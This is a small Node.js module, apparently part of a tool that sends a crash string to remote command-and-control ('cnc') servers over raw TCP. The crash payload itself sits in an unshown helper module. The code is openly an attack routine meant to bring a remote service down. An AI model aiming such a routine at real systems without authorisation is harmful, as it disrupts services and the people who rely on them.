const net = require("net");
const util = require("../src/util");

module.exports.crash = (host, port) => {
    return new Promise((resolve, reject) => {
        let socket = new net.Socket()

        socket.connect(port, host, () => {
            console.log(`(cnc): connected to ${host}:${port}`);
            console.log(`(cnc): attempted crash`);

            util.getString().then(str => {
                socket.write(`${str}\n`);
                socket.destroy();
            });
        });

        socket.on("close", () => {
            console.log(`(cnc): connection closed`);
            return resolve(JSON.stringify({
                error: true,
                message: "Sent crash attempt"
            }));
        });
    });
}